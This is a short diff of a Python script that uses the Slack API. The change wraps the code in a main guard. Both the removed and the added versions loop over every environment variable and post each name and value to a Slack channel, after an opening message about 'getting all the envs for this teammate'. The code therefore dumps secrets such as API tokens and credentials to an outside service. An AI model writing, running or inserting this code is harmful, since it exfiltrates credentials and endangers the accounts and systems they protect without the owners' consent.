@@ -17,25 +17,21 @@ SLACK_TOKEN = os.environ.get('SLACK_API_TOKEN')
 client = WebClient(token=os.environ.get("SLACK_BOT_TOKEN"))
 initial_comment = (f"Getting all the envs for this teammate'")
 
-
-try: 
-  result = client.chat_postMessage(
-      channel=CHANNEL_ID,
-      text=initial_comment
-  )
-
-
-  for name, value in os.environ.items():
-      result = client.chat_postMessage(
+if __name__ == "__main__":
+  try: 
+    result = client.chat_postMessage(
         channel=CHANNEL_ID,
-        text="{0}: {1}".format(name, value)
-          )
+        text=initial_comment
+    )
 
-except SlackApiError as e:
-    print(f"Error: {e}")
 
-# Example usage
-# do something with the data
+    for name, value in os.environ.items():
+        result = client.chat_postMessage(
+          channel=CHANNEL_ID,
+          text="{0}: {1}".format(name, value)
+            )
 
+  except SlackApiError as e:
+      print(f"Error: {e}")
 
 
